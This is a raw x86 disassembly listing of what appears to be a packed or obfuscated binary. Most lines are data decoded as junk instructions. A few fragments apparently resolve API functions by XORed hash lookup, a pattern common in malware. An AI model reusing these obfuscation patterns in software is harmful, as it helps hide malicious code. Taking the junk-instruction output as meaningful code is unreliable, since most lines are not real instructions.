  41496f:	xor    eax,DWORD PTR [ecx+0x2bcce86c]
  414975:	or     eax,ebx
  414977:	cmc    
  414978:	jb     0x4149f3
  41497a:	fwait
  41497b:	int3   
  41497c:	push   eax
  41497d:	scas   eax,DWORD PTR es:[edi]
  41497e:	pop    ds
  41497f:	in     al,dx
  414980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414981:	mov    eax,0xb8a8726c
  414986:	sahf   
  414987:	xlat   BYTE PTR ds:[ebx]
  414988:	ret    0xfa11
  41498b:	pop    ebp
  41498c:	mov    bl,0xc0
  41498e:	sbb    DWORD PTR [ebp+0x58],ebp
  414991:	pop    ebp
  414992:	xchg   esi,ebp
  414994:	inc    esp
  414995:	xor    edi,DWORD PTR [ebp-0x5]
  414998:	xor    al,0xa6
  41499a:	(bad)  
  41499b:	shl    DWORD PTR [eax+ebp*1+0x649e5487],cl
  4149a2:	mov    dh,BYTE PTR [edi+esi*4+0x75]
  4149a6:	add    eax,0x703f235
  4149ab:	repnz dec ebp
  4149ad:	or     eax,0xb0e09511
  4149b2:	and    al,0x4e
  4149b4:	pop    DWORD PTR [edx+0x3a99f077]
  4149ba:	xchg   ecx,eax
  4149bb:	jmp    0x471c:0x9d1e9a23
  4149c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4149c3:	sub    BYTE PTR [ebp+0x60546395],dl
  4149c9:	xor    BYTE PTR [ecx*1+0x42c858aa],0xf6
  4149d1:	repz div BYTE PTR [ebp-0x15f689d5]
  4149d8:	pop    ebp
  4149d9:	bound  edx,QWORD PTR [ebp*1-0x9a62bd2]
  4149e0:	es cwde 
  4149e2:	(bad)  
  4149e4:	pop    ebx
  4149e5:	(bad)  
  4149e6:	or     eax,0x240d6360
  4149eb:	rcr    DWORD PTR [edi],0x2d
  4149ee:	xlat   BYTE PTR ds:[ebx]
  4149ef:	std    
  4149f0:	imul   esp,edi,0xffffff88
  4149f3:	mov    ch,0x1b
  4149f5:	out    dx,eax
  4149f6:	push   esp
  4149f7:	fwait
  4149f8:	lods   al,BYTE PTR ds:[esi]
  4149f9:	idiv   DWORD PTR [edi+0xb]
  4149fc:	enter  0xe7b0,0x65
  414a00:	or     esi,DWORD PTR [edi]
  414a02:	or     DWORD PTR [ebp+0x3dad66e1],0x5d
  414a09:	push   es
  414a0a:	(bad)  
  414a0b:	jle    0x4149ea
  414a0d:	and    eax,0xecfa21e4
  414a12:	seto   BYTE PTR [ecx+0x5a]
  414a16:	xor    esp,esi
  414a18:	push   edx
  414a19:	sbb    esi,DWORD PTR [edi-0x579e3b26]
  414a1f:	fidiv  DWORD PTR [ecx+0x66988d25]
  414a25:	in     al,0x1e
  414a27:	push   0x52b3b7d
  414a2c:	ret    0x966a
  414a2f:	push   ebp
  414a30:	xlat   BYTE PTR ds:[ebx]
  414a31:	(bad)
  414a34:	mov    ebp,edi
  414a36:	pop    edx
  414a37:	dec    edi
  414a38:	inc    eax
  414a39:	mov    fs,WORD PTR [edx+0x50]
  414a3c:	fs lahf 
  414a3e:	jl     0x414a3f
  414a40:	scas   al,BYTE PTR es:[edi]
  414a41:	pusha  
  414a42:	gs cld 
  414a44:	pusha  
  414a45:	pop    edx
  414a46:	idiv   DWORD PTR [edi+0x30]
  414a49:	pop    ebp
  414a4a:	or     BYTE PTR [ecx+0x17],al
  414a4d:	dec    edi
  414a4e:	rcr    BYTE PTR [ebp-0x503492df],1
  414a54:	fiadd  WORD PTR [edi]
  414a56:	dec    esi
  414a57:	js     0x4149f3
  414a59:	ret    0xff26
  414a5c:	dec    ebx
  414a5d:	inc    edi
  414a5e:	outs   dx,BYTE PTR ds:[esi]
  414a5f:	adc    al,0xc5
  414a61:	xchg   esp,eax
  414a62:	sub    DWORD PTR [edx+0x788fa2de],esi
  414a68:	xor    edx,DWORD PTR [ecx+edi*4+0x7ba74335]
  414a6f:	xchg   BYTE PTR [edx-0x4d822fb4],al
  414a75:	xchg   ebp,eax
  414a76:	jns    0x414abd
  414a78:	jb     0x414aeb
  414a7a:	in     al,dx
  414a7b:	xor    esi,DWORD PTR [eax+eax*2]
  414a7e:	call   0x306efebc
  414a83:	pusha  
  414a84:	inc    edi
  414a85:	mov    esi,0x8e9d7e75
  414a8a:	(bad)  
  414a8b:	push   ss
  414a8c:	mov    esi,0x1ddf1af5
  414a91:	loop   0x414b03
  414a93:	xchg   esp,eax
  414a94:	(bad)  
  414a95:	sub    edx,ebp
  414a97:	mov    bl,0xe
  414a99:	mov    dh,0x49
  414a9b:	push   edx
  414a9c:	es ret 0xa71e
  414aa0:	mov    dh,ch
  414aa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414aa3:	fnstcw WORD PTR ss:[edx]
  414aa6:	dec    esp
  414aa7:	fnstsw WORD PTR [ecx]
  414aa9:	or     dl,BYTE PTR [eax]
  414aab:	(bad)  
  414aac:	retf   0x54bf
  414aaf:	pop    edi
  414ab0:	pop    edx
  414ab1:	ds inc eax
  414ab3:	push   ebp
  414ab4:	das    
  414ab5:	xchg   DWORD PTR [ebx+0x16],esi
  414ab8:	ror    DWORD PTR [esp+eiz*4+0x50],0x10
  414abd:	push   ebp
  414abe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414abf:	dec    edx
  414ac0:	nop
  414ac1:	push   esi
  414ac2:	xor    al,0x9d
  414ac4:	adc    eax,0x15c5d1d6
  414ac9:	rcr    BYTE PTR [esi],cl
  414acb:	fidivr DWORD PTR [edi-0x35]
  414ace:	(bad)  
  414acf:	in     eax,dx
  414ad0:	push   eax
  414ad1:	jl     0x414af2
  414ad3:	in     eax,dx
  414ad4:	xchg   ecx,eax
  414ad5:	sbb    bh,bl
  414ad7:	mov    al,ds:0xfe216cd2
  414adc:	sti    
  414add:	jno    0x414a78
  414adf:	push   ecx
  414ae0:	adc    dl,BYTE PTR [edx-0x59b4f3b3]
  414ae6:	xchg   ebp,eax
  414ae7:	(bad)  
  414ae8:	outs   dx,DWORD PTR ds:[esi]
  414ae9:	in     al,dx
  414aea:	inc    esp
  414aeb:	add    eax,0xf13cf05
  414af0:	dec    ecx
  414af1:	inc    ebx
  414af2:	les    esp,FWORD PTR [eax+eiz*1-0x56]
  414af6:	fld    QWORD PTR [edi-0x38c1f89e]
  414afc:	cmp    cl,cl
  414afe:	add    DWORD PTR [edi],ecx
  414b00:	inc    esi
  414b01:	sbb    eax,DWORD PTR [edi]
  414b03:	dec    esi
  414b04:	in     al,dx
  414b05:	xchg   ecx,eax
  414b06:	dec    esi
  414b07:	popf   
  414b08:	push   esp
  414b09:	out    dx,al
  414b0a:	scas   eax,DWORD PTR es:[edi]
  414b0b:	push   edi
  414b0c:	mov    ch,al
  414b0e:	mov    al,0x7e
  414b10:	push   eax
  414b11:	sbb    edx,DWORD PTR [edx-0x167ae0a0]
  414b17:	ins    DWORD PTR es:[edi],dx
  414b18:	fcomp  QWORD PTR [eax]
  414b1a:	mov    esp,0x9c6c91e0
  414b1f:	mov    al,0xeb
  414b21:	test   al,0x7b
  414b23:	dec    ebp
  414b24:	adc    eax,0x2893045f
  414b29:	jg     0x414ae8
  414b2b:	jl     0x414b95
  414b2d:	push   ebp
  414b2e:	shr    DWORD PTR [ebx-0x52],1
  414b31:	fiadd  WORD PTR ss:[ebx]
  414b34:	ret    
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	mov    edi,0x5b5c7402
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414ba3
  414bc3:	xchg   ebx,eax
  414bc5:	sub    edi,DWORD PTR [ebx+0x64a914e2]
  414bcb:	or     BYTE PTR [eax+ebx*4+0x7a],cl
  414bcf:	div    DWORD PTR [ebx+0x49]
  414bd2:	dec    ecx
  414bd3:	add    al,0x44
  414bd5:	mov    ebp,0x54b4bfb1
  414bda:	add    eax,0xdc39445b
  414bdf:	cmp    cl,al
  414be1:	mov    cl,0x3a
  414be3:	push   ecx
  414be4:	stos   BYTE PTR es:[edi],al
  414be5:	mov    ah,0x42
  414be7:	sbb    al,0xa2
  414be9:	dec    edi
  414bea:	sbb    DWORD PTR [ebp+0x19242651],esp
  414bf0:	imul   ebx,ebx,0x98b59e85
  414bf6:	or     al,0x68
  414bf8:	mov    DWORD PTR [edx],edx
  414bfa:	mov    eax,ds:0x72eebeab
  414bff:	pushf  
  414c00:	iret   
  414c01:	jno    0x414c2a
  414c03:	jo     0x414c79
  414c05:	(bad)  
  414c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c07:	xchg   DWORD PTR [edi],esp
  414c09:	mov    bl,0xc2
  414c0b:	xchg   BYTE PTR [edx+0x5b],ah
  414c0e:	adc    edx,ecx
  414c10:	lds    ebp,FWORD PTR [edx-0x2]
  414c13:	jmp    0xf1d6ea87
  414c18:	dec    edi
  414c19:	in     eax,0x85
  414c1b:	jg     0x414c06
  414c1d:	outs   dx,DWORD PTR ds:[esi]
  414c1e:	push   eax
  414c1f:	mov    dh,BYTE PTR [ebx+0x7aa7980d]
  414c25:	in     al,dx
  414c26:	xchg   edx,eax
  414c27:	and    al,0xd4
  414c29:	mov    eax,ss
  414c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414c2c:	loopne 0x414c46
  414c2e:	call   esp
  414c30:	rcr    BYTE PTR [esi+0x4495e4a8],0xc
  414c37:	pusha  
  414c38:	and    al,0xe7
  414c3a:	and    bl,BYTE PTR [esi]
  414c3c:	repnz dec esp
  414c3e:	pmaddwd mm3,QWORD PTR [edx]
  414c41:	sub    DWORD PTR [edx],edi
  414c43:	iret   
  414c44:	fcomp  QWORD PTR [ebx-0x75]
  414c47:	xchg   esi,eax
  414c48:	enter  0x9512,0x4
  414c4c:	add    DWORD PTR [edx+0x41ceb8eb],eax
  414c52:	(bad)  
  414c54:	(bad)  
  414c55:	icebp  
  414c56:	enter  0xad36,0x35
  414c5a:	dec    ebx
  414c5b:	jo     0x414caa
  414c5d:	xchg   edi,eax
  414c5e:	cdq    
  414c5f:	fcomp  DWORD PTR [ecx+0x3868bac1]
  414c65:	sub    edi,DWORD PTR [esi+0x2d]
  414c68:	retf   
  414c69:	push   edi
  414c6a:	xor    DWORD PTR [edi+0x66f1f0e4],edx
  414c70:	pop    eax
  414c71:	jno    0x414bf7
  414c73:	mov    edi,0x9fa25071
  414c78:	dec    ebx
  414c79:	lods   al,BYTE PTR ds:[esi]
  414c7a:	aad    0xba
  414c7c:	xchg   BYTE PTR [eax-0x2faf446b],bh
  414c82:	inc    esi
  414c83:	cs fsub st(6),st
  414c86:	fistp  QWORD PTR ds:0x2e4fe85
  414c8c:	imul   ecx,edx,0x59
  414c8f:	or     eax,0x68585669
  414c94:	adc    BYTE PTR [ebp+0x623ab54c],dl
  414c9a:	push   ebx
  414c9b:	jnp    0x414c5e
  414c9d:	push   eax
  414c9e:	fistp  QWORD PTR [ebp+0x5dba8bef]
  414ca4:	pusha  
  414ca5:	mov    WORD PTR [ebx-0x1aa91a31],cs
  414cab:	dec    esp
  414cac:	mov    ah,0x3
  414cae:	xchg   esi,eax
  414caf:	nop
  414cb0:	push   es
  414cb1:	and    BYTE PTR [eax+ebx*4],dh
  414cb4:	fnsave [edi+0x2371c850]
  414cba:	ficomp DWORD PTR [ebx-0x6f65091b]
  414cc0:	mov    al,ds:0xb5f39fd3
  414cc5:	xchg   edi,eax
  414cc6:	add    eax,DWORD PTR [edx]
  414cc8:	lds    ebp,FWORD PTR [ebx]
  414cca:	add    BYTE PTR [edi],ah
  414ccc:	and    edx,0x0
  414ccf:	pop    es
  414cd0:	mov    ebp,0x715b978c
  414cd5:	cli    
  414cd6:	retf   0xc704
  414cd9:	and    DWORD PTR [ebp-0x5335d3e],ecx
  414cdf:	sbb    DWORD PTR [ecx-0x47],esi
  414ce2:	mov    esp,0x671e1229
  414ce7:	jecxz  0x414d3a
  414ce9:	pop    edx
  414cea:	in     al,dx
  414ceb:	jecxz  0x414c73
  414ced:	mov    bl,0x9c
  414cef:	lods   eax,DWORD PTR ds:[esi]
  414cf0:	ja     0x414ceb
  414cf2:	fsqrt  
  414cf4:	add    BYTE PTR [edx+0x16d3d678],0xfc
  414cfb:	mov    bl,0x41
  414cfd:	shl    DWORD PTR [ecx+0x22ffd3a2],cl
  414d03:	in     al,0xe2
  414d05:	ins    BYTE PTR es:[edi],dx
  414d06:	cmc    
  414d07:	mov    ecx,0x8679b995
  414d0c:	mov    dh,0x95
  414d0e:	cli    
  414d0f:	mov    ecx,0xa0748a0e
  414d14:	xchg   ebp,eax
  414d15:	fcomp  st(0)
  414d17:	sahf   
  414d18:	mov    esp,0xf933d88f
  414d1d:	jl     0x414d11
  414d1f:	mov    esp,0xa8f8a338
  414d24:	in     al,0x31
  414d26:	movntq QWORD PTR ds:0xb0bc8ae2,mm3
  414d2d:	and    al,0x71
  414d2f:	dec    edi
  414d30:	mov    edx,0x8886ae12
  414d35:	rol    BYTE PTR ss:[edx],cl
  414d38:	jnp    0x414cba
  414d3a:	mov    DWORD PTR [ebp-0x1a863c0e],0x14d4080
  414d44:	shr    DWORD PTR [eax+ebp*4+0x0],0xda
  414d49:	xchg   ebp,eax
  414d4a:	lahf   
  414d4b:	idiv   BYTE PTR [esi+0x3]
  414d4e:	bnd jbe 0x414d8a
  414d51:	push   es
  414d52:	stc    
  414d53:	mov    bh,0xbd
  414d55:	mov    ch,0xab
  414d57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d58:	js     0x414d7d
  414d5a:	push   esp
  414d5b:	pop    eax
  414d5c:	in     al,0xc2
  414d5e:	push   cs
  414d5f:	sbb    dh,BYTE PTR [eax+edx*8]
  414d62:	mov    al,ds:0x5699fc93
  414d67:	out    dx,al
  414d68:	xor    bl,BYTE PTR [eax-0x1f]
  414d6b:	mov    al,ds:0x7f8ecca4
  414d70:	out    dx,al
  414d71:	and    esp,DWORD PTR [edi-0x5b3a046d]
  414d77:	xor    DWORD PTR [ecx+ebp*2],edx
  414d7a:	xor    eax,0x90a3db74
  414d7f:	ror    DWORD PTR [edi+0x52691ece],1
  414d85:	mov    ds:0x1dc2e16,eax
  414d8a:	in     eax,0xf9
  414d8c:	and    DWORD PTR [eax-0x973fd89],0xdf8a7dd2
  414d96:	adc    ah,BYTE PTR ds:0xb1761d03
  414d9c:	adc    eax,DWORD PTR [esi]
  414d9e:	sub    DWORD PTR [ecx],edx
  414da0:	mov    eax,ds:0x7ed1a317
  414da5:	stos   DWORD PTR es:[edi],eax
  414da6:	mul    DWORD PTR [esi+eax*8+0x2441c638]
  414dad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dae:	mov    al,0x7
  414db0:	xor    ebp,DWORD PTR [esi]
  414db2:	pop    ebp
  414db3:	mov    ecx,DWORD PTR [ebp-0x36]
  414db6:	inc    ecx
  414db7:	leave  
  414db8:	std    
  414db9:	xor    edx,DWORD PTR [ecx+ecx*2-0x37]
  414dbd:	(bad)  
  414dbe:	xor    eax,DWORD PTR [ebp-0x35]
  414dc1:	cmp    ebp,DWORD PTR [ebx-0x16c5e41a]
  414dc7:	test   al,0x7d
  414dc9:	clts   
  414dcb:	fs jb  0x414e19
  414dce:	sbb    cl,ch
  414dd0:	push   cs
  414dd1:	adc    BYTE PTR [ecx+0x16],0x46
  414dd5:	mov    dh,0x9
  414dd7:	daa    
  414dd8:	(bad)  [edi-0x11]
  414ddb:	mov    ch,0xbe
  414ddd:	mov    cl,0xd7
  414ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414de0:	fldenv [ebp+0x39]
  414de3:	xor    eax,0x773cf367
  414de8:	sub    ebp,DWORD PTR [esi+0x2a]
  414deb:	ss sub eax,0x827d6e06
  414df1:	adc    eax,0x99b56b87
  414df6:	or     DWORD PTR [ebx+ebx*4-0x63],edi
  414dfa:	mov    dh,0xe4
  414dfc:	and    DWORD PTR [edi+0x3ff1759],eax
  414e02:	sub    BYTE PTR [ebx],0x8f
  414e05:	adc    dh,BYTE PTR [ebx]
  414e07:	out    dx,eax
  414e08:	outs   dx,BYTE PTR ds:[esi]
  414e09:	icebp  
  414e0a:	arpl   WORD PTR [ecx],bx
  414e0c:	pop    edi
  414e0d:	hlt    
  414e0e:	lahf   
  414e0f:	xor    eax,0x1e399801
  414e14:	mov    dl,0xfb
  414e16:	repnz aam 0x2f
  414e19:	mov    esi,0x8fba02a6
  414e1e:	mov    dh,0x48
  414e20:	add    BYTE PTR ds:0x6b59d172,ch
  414e26:	push   esp
  414e27:	pop    edx
  414e28:	test   BYTE PTR [edi],dh
  414e2a:	xor    ah,al
  414e2c:	inc    edi
  414e2d:	add    al,0xc1
  414e2f:	sub    al,0x91
  414e31:	pop    edi
  414e32:	jb     0x414df3
  414e34:	inc    esp
  414e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414e36:	aad    0x42
  414e38:	jae    0x414ea2
  414e3a:	xchg   DWORD PTR [ecx],ecx
  414e3c:	mov    BYTE PTR [ebp+0x11],ch
  414e3f:	mov    WORD PTR [esi+eax*1+0x5a],es
  414e43:	js     0x414df1
  414e45:	(bad)  
  414e46:	in     al,dx
  414e47:	jnp    0x414de0
  414e49:	sub    al,0xfa
  414e4b:	popa   
  414e4c:	cli    
  414e4d:	cdq    
  414e4e:	js     0x414eb8
  414e50:	cmp    DWORD PTR [eax+esi*4+0x2b],edx
  414e54:	cmp    ecx,DWORD PTR [esi-0x6a304252]
  414e5a:	shl    DWORD PTR [esi+0x2658629b],0x41
  414e61:	test   al,0x76
  414e63:	es adc eax,0x203512b
  414e69:	mov    edx,0x43244403
  414e6e:	(bad)  
  414e6f:	adc    esp,DWORD PTR [ecx]
  414e71:	aam    0x4c
  414e73:	push   cs
  414e74:	xchg   BYTE PTR [ecx],dh
  414e76:	push   ss
  414e77:	(bad)  
  414e78:	sub    al,BYTE PTR [esi-0x3a51b6bd]
  414e7e:	sub    al,0x3b
  414e80:	test   BYTE PTR [ebp-0x4b9fa45a],al
  414e86:	xchg   ebx,eax
  414e87:	jb     0x414e72
  414e89:	pop    ecx
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	imul   DWORD PTR [edx+0x13]
  414eaf:	add    esp,DWORD PTR [eax+edi*2+0x7eb9707f]
  414eb6:	jo     0x414f28
  414eb8:	push   eax
  414eb9:	daa    
  414eba:	sar    DWORD PTR [eax-0x105a396],cl
  414ec0:	pop    es
  414ec1:	stos   BYTE PTR es:[edi],al
  414ec2:	add    BYTE PTR [ebx+0x61853830],dl
  414ec8:	and    al,0xee
  414eca:	fxch   st(6)
  414ecc:	pop    ecx
  414ecd:	inc    esp
  414ece:	dec    esi
  414ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ed0:	shl    dl,0xe7
  414ed3:	mul    BYTE PTR [ebp+0x4e805648]
  414ed9:	mov    edx,0x2304d2ab
  414ede:	shr    BYTE PTR [edi],cl
  414ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ee1:	inc    esi
  414ee2:	js     0x414ef7
  414ee4:	cmc    
  414ee5:	sar    BYTE PTR [ecx-0xb],cl
  414ee8:	sbb    DWORD PTR [ebx],0x4
  414eeb:	es jns 0x414ef9
  414eee:	push   edx
  414eef:	push   0x72bba49e
  414ef4:	retf   0x4560
  414ef7:	jmp    0x1a2af817
  414efc:	ins    BYTE PTR es:[edi],dx
  414efd:	std    
  414efe:	cli    
  414eff:	sbb    bl,ch
  414f01:	dec    ecx
  414f02:	sar    BYTE PTR [ecx-0x19],cl
  414f05:	jge    0x414eeb
  414f07:	xor    eax,0x8e91cec5
  414f0c:	ret    
  414f0d:	inc    ecx
  414f0e:	push   eax
  414f0f:	out    dx,al
  414f10:	loop   0x414ecf
  414f12:	rcl    al,1
  414f14:	xchg   ebp,eax
  414f15:	cli    
  414f16:	loop   0x414f10
  414f18:	add    ebx,DWORD PTR [ebp+0x52]
  414f1b:	sar    BYTE PTR [ebx-0x514da034],cl
  414f21:	fisttp DWORD PTR [esi+0x33bd35dd]
  414f27:	sub    eax,0xc6eb6960
  414f2c:	add    dh,BYTE PTR gs:[ecx]
  414f2f:	inc    esi
  414f30:	jne    0x414eea
  414f32:	dec    esp
  414f33:	add    BYTE PTR [esi-0x2513d64d],0x93
  414f3a:	addr16 mov ecx,0xdb7f2216
  414f40:	es dec esp
  414f42:	inc    ecx
  414f43:	push   ecx
  414f44:	xor    eax,0xd1161884
  414f49:	sar    edx,1
  414f4b:	push   ecx
  414f4c:	mov    esi,0xa05b4e8a
  414f51:	xchg   DWORD PTR [ebp+0x62],ebp
  414f54:	cld    
  414f55:	(bad)  
  414f56:	hlt    
  414f57:	(bad)  
  414f58:	pop    es
  414f59:	and    DWORD PTR [ebx-0x22],ebp
  414f5c:	jne    0x414ee0
  414f5e:	dec    eax
  414f5f:	mov    dh,0x21
  414f61:	cdq    
  414f62:	adc    ah,BYTE PTR [edi+0x53d27dc9]
  414f68:	mov    BYTE PTR [eax+0x2ea52d08],ah
  414f6e:	rcr    BYTE PTR es:[edi],cl
  414f71:	jo     0x414fe9
  414f73:	test   eax,0xeb490b3d
  414f78:	out    dx,al
  414f79:	inc    edi
  414f7a:	das    
  414f7b:	ror    ah,0xec
  414f7e:	cdq    
  414f7f:	sbb    dh,BYTE PTR [edi-0x4d]
  414f82:	mov    al,ds:0x18ac5407
  414f87:	sub    BYTE PTR [ecx+ebx*1],dl
  414f8a:	pop    esp
  414f8b:	out    dx,eax
  414f8c:	ja     0x414f30
  414f8e:	inc    ebx
  414f8f:	mov    dh,0x92
  414f91:	les    ebp,FWORD PTR [ebp-0x4e8bd3df]
  414f97:	mov    esi,DWORD PTR [ecx]
  414f99:	mov    eax,ds:0xbd3ae3ec
  414f9e:	cli    
  414f9f:	cdq    
  414fa0:	xchg   ecx,eax
  414fa1:	and    DWORD PTR [edx+0x6f],esp
  414fa4:	sub    edx,ecx
  414fa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fa7:	je     0x415020
  414fa9:	mov    edi,0xe4929a4
  414fae:	inc    edi
  414faf:	cmp    al,0xaa
  414fb1:	lds    esi,FWORD PTR [edx]
  414fb3:	leave  
  414fb4:	imul   edi,DWORD PTR [esp+ebx*1+0x7ec461e6],0x5fffa015
  414fbf:	leave  
  414fc0:	sub    ah,BYTE PTR [ebp-0x3c56c49e]
  414fc6:	gs mov ebx,0xd9d20dc1
  414fcc:	rol    DWORD PTR [edi],cl
  414fce:	scas   eax,DWORD PTR es:[edi]
  414fcf:	pop    esi
  414fd0:	add    BYTE PTR [ecx-0x8],al
  414fd3:	mov    edi,0xa10883de
  414fd8:	retf   0x6e3f
  414fdb:	loopne 0x415048
  414fdd:	mov    bl,0x6f
  414fdf:	leave  
  414fe0:	pop    ebp
  414fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fe2:	mov    esp,0xb9d813a1
  414fe7:	xchg   esp,eax
  414fe8:	clc    
  414fe9:	and    eax,0x9ce9d983
  414fee:	icebp  
  414fef:	pop    ebx
  414ff0:	ins    BYTE PTR es:[edi],dx
  414ff1:	xor    DWORD PTR [ecx-0x5c],edi
  414ff4:	scas   al,BYTE PTR es:[edi]
  414ff5:	lods   eax,DWORD PTR ds:[esi]
  414ff6:	adc    ch,BYTE PTR [esi-0x58]
  414ff9:	aas    
  414ffa:	out    0x5e,eax
  414ffc:	xor    eax,0xfc5f125b
  415001:	mov    bl,0xb3
  415003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415004:	pop    ecx
  415005:	es cs mov al,0xf
  415009:	mov    al,BYTE PTR [esp+ebp*4-0x58e2d75f]
  415010:	jb     0x414fcb
  415012:	test   eax,0xbacff2e2
  415017:	and    dl,0x4d
  41501a:	jne    0x414fa6
  41501c:	aaa    
  41501d:	std    
  41501e:	outs   dx,DWORD PTR ds:[esi]
  41501f:	sbb    BYTE PTR [edx+0x68019ba],cl
  415025:	and    al,0xf3
  415027:	js     0x41502e
  415029:	addr16 test edi,esi
  41502c:	sahf   
  41502d:	pop    ss
  41502e:	daa    
  41502f:	sub    al,0xd9
  415031:	outs   dx,DWORD PTR ds:[esi]
  415032:	push   esi
  415033:	add    eax,0x161f8c54
  415038:	loope  0x415038
  41503a:	test   eax,0xf8c8c52f
  41503f:	ja     0x41503b
  415041:	jb     0x414ff8
  415043:	mov    esi,0x69edfe3b
  415048:	leave  
  415049:	sbb    eax,0xfdb965cd
  41504e:	adc    al,0x4b
  415050:	sub    ebx,DWORD PTR [ebx+ecx*8]
  415053:	add    ecx,DWORD PTR [edi-0x62dbbd13]
  415059:	xor    DWORD PTR [ecx+0x2a2773bd],0xffffffc1
  415060:	lods   al,BYTE PTR ds:[esi]
  415061:	das    
  415062:	shl    DWORD PTR [edi-0x1c],0x60
  415066:	pop    ecx
  415067:	std    
  415068:	jge    0x4150ab
  41506a:	jmp    0xc8f5:0x14d1ebc6
  415071:	jno    0x415032
  415073:	fs jmp 0x415096
  415076:	out    dx,al
  415077:	add    al,0xe
  415079:	arpl   WORD PTR es:[esi],sp
  41507c:	data16 (bad) 
  41507e:	pop    ds
  41507f:	cmp    ebx,DWORD PTR [ecx+0x7a]
  415082:	add    al,0xa
  415084:	dec    ebx
  415085:	inc    eax
  415086:	les    ebx,FWORD PTR [ebx-0x3a05b4fa]
  41508c:	sbb    DWORD PTR [esi],esp
  41508e:	ja     0x4150b5
  415090:	xor    dh,cl
  415092:	cmp    DWORD PTR [ebp-0x5],ebp
  415095:	and    al,0x33
  415097:	push   es
  415098:	push   0x17
  41509a:	out    dx,al
  41509b:	push   ebx
  41509c:	jp     0x41505d
  41509e:	cld    
  41509f:	ss jg  0x4150d5
  4150a2:	pop    ebx
  4150a3:	js     0x415044
  4150a5:	outs   dx,BYTE PTR ds:[esi]
  4150a6:	sahf   
  4150a7:	les    ebp,FWORD PTR [esi+0x40d26dad]
  4150ad:	daa    
  4150ae:	inc    ebx
  4150af:	(bad)
  4150b2:	retf   0x504
  4150b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150b6:	jge    0x4150f9
  4150b8:	inc    eax
  4150b9:	jb     0x41505e
  4150bb:	loopne 0x4150d3
  4150bd:	push   esp
  4150be:	aas    
  4150bf:	cmp    DWORD PTR [eax-0xe1e516f],esp
  4150c5:	xor    eax,0x918d5f06
  4150ca:	aam    0x6d
  4150cc:	or     al,0x15
  4150ce:	push   esi
  4150cf:	das    
  4150d0:	sti    
  4150d1:	out    0x68,al
  4150d3:	mov    esp,0x62e3a8d7
  4150d8:	sbb    eax,0x21ef5b18
  4150dd:	pop    ecx
  4150de:	sbb    DWORD PTR [ebx],ebp
  4150e0:	repz das 
  4150e2:	inc    ebp
  4150e3:	outs   dx,BYTE PTR ds:[esi]
  4150e4:	add    DWORD PTR [ebp+0x3d],ecx
  4150e7:	adc    al,0x4e
  4150e9:	cmp    ecx,0xec97407a
  4150ef:	adc    dl,BYTE PTR [ebx-0xc]
  4150f2:	push   es
  4150f3:	lods   al,BYTE PTR ds:[esi]
  4150f4:	sbb    BYTE PTR [ebx-0x42],dl
  4150f7:	add    edx,DWORD PTR [ecx]
  4150f9:	scas   al,BYTE PTR es:[edi]
  4150fa:	fadd   DWORD PTR [ecx]
  4150fc:	or     edx,DWORD PTR [esi+0x7a440fd9]
  415102:	and    al,0x6d
  415104:	jns    0x415107
  415106:	lea    edx,ds:0x5e1d9074
  41510c:	addr16 popa 
  41510e:	popf   
  41510f:	push   edi
